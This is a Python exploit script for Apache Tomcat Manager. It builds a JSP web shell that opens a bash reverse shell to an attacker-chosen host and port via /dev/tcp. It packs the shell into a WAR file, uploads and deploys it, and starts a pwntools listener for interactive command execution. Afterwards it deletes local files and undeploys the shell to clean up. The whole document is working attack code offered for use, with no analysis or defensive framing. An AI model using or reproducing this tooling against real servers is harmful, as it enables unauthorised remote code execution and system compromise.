#!/bin/env python3

import requests as req
from bs4 import BeautifulSoup
from pwn import *
import base64
import subprocess
import shutil


# Login to /manager/html
def login(login_url, headers):
    # Create a session
    session = req.Session()

    # Log in to Tomcat Manager
    response = session.get(login_url, headers=headers)

    if response.status_code == 200:
        return response
    else:
        print("[-] Login failed")
        exit()


# Get the required info for the upload
def get_upload_info(response):
    # Parse the response
    soup = BeautifulSoup(response.content, "html.parser")

    # Find the form, post url and the file variable name
    form = soup.select_one('form[action*="upload"]')
    post_url = form["action"]
    file_variable_name = form.select_one('input[type="file"]')["name"]

    return post_url, file_variable_name


# Trigger the reverse shell
def trigger(revshell_url, headers):
    print(f"[*] Reverse Shell: {revshell_url}")
    res = req.get(revshell_url, headers=headers)


# Upload WAR file
def upload(upload_url, headers, file_variable, lhost, lport, shell_name):
    files = {file_variable: (f"{shell_name}.war", open(f"{shell_name}.war", "rb"))}
    # print(f"[*] Upload URL: {upload_url}")
    # Make a POST request to submit the form
    response = req.post(upload_url, headers=headers, files=files)

    # Check the response from the server
    if response.status_code == 200:
        print("[+] WAR file uploaded and deployed successfully.")
    else:
        print("[-] Failed to upload")

    # start the listener
    listener(lhost, lport)


# Run commands on the reverse shell
def run_cmd(connection):
    while True:
        # Get user input
        cmd = input()
        if "exit" in cmd:
            print("[!] Exiting...")
            exit()
        elif "shell" in cmd:
            # The interactive shell provided by pwntools
            print("[*] Getting interactive shell: ...")
            connection.interactive()
        else:
            # Send & Exec commands one the reverse shell
            connection.send(cmd.encode())
            # Receive the output of the commands
            res = connection.recvuntil(b"$ ")
            # Print the response
            print(res.decode(), end="")


# Reverse Shell Listener
def listener(lhost, lport):
    print(f"[+] Listener started on {lhost}:{lport}")
    revshell_listener = listen(lport, lhost)
    # Waiting for connection
    connection = revshell_listener.wait_for_connection()
    print(connection.recvuntil(b"$ ").decode(), end="")
    run_cmd(connection)


# Generate the revshell payload
def generate_payload(shell_name, lhost, lport):
    # Reverse shell payload
    payload = f"""
    <h1>Congratulations for the reverse shell</h1>

    <%@ page import="java.io.*" %>
    <%

       String output = "";
           try {{
            ProcessBuilder pb = new ProcessBuilder("/bin/bash", "-c","/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1");
            Process p = pb.start();

            BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = sI.readLine()) != null) {{
                output += line + "</br>";
            }}

            // Wait for the process to finish and check the exit status
            int exitCode = p.waitFor();
            if (exitCode != 0) {{
                output = "Error Occurred";
            }}
           }} catch (IOException | InterruptedException e) {{
               e.printStackTrace();
               output = "An Error Occurred";
           }}

    %>

    <pre><%=output %></pre>
    """

    # save the payload to a file
    with open("./index.jsp", "w") as f:
        f.write(payload)

    # Make the archive
    shutil.make_archive(f"{shell_name}", "zip", ".", "index.jsp")
    # Rename the generated zip file to .war
    shutil.move(f"{shell_name}.zip", f"{shell_name}.war")

    # OR you create the WAR file using jar
    # first check if jar exist before using it, otherwise the first method works well
    # subprocess.run(["jar", "-cvf", f"{shell_name}.war", "index.jsp"], check=True)


def clear(response, url, headers, shell_name):
    print("[!] Cleaning...")

    # 1. Delete all related files
    files_to_delete = ["index.jsp", f"{shell_name}.war"]
    for file_name in files_to_delete:
        try:
            os.remove(file_name)
            print(f"[*] Deleted {file_name}")
        except OSError as e:
            print(f"[-] Error deleting {file_name}: {e}")

    # 2. Undeploy the revshell (you might need to customize this part)
    soup = BeautifulSoup(response.content, "html.parser")
    form = soup.select_one(f"form[action*='{shell_name}'][action*='undeploy']")
    undeploy = form["action"]
    undeploy_url = url + undeploy
    # print(undeploy_url)
    try:
        response = req.post(undeploy_url, headers=headers)
        if response.status_code == 200:
            print("[*] Undeployed the revshell.")
        else:
            print("[-] Failed to undeploy the revshell.")
    except Exception as e:
        print(f"[-] Error undeploying the revshell: {e}")

    # 3. Close the socket connection (if it's open)
    if "connection" in locals() and hasattr(connection, "close"):
        try:
            connection.close()
            print("[*] Closed the socket connection.")
        except Exception as e:
            print(f"[-] Error closing the socket connection: {e}")
